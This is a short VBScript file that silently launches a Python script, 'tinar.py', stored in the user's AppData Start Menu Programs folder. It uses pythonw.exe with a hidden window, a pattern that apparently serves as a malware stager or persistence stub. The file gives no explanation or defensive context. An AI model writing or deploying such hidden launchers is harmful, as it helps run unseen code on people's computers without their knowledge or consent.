Set objShell = CreateObject("WScript.Shell")
scriptPath = objShell.ExpandEnvironmentStrings("%AppData%\Microsoft\Windows\Start Menu\Programs\tinar.py")
objShell.Run "pythonw.exe """ & scriptPath & """", 0, True
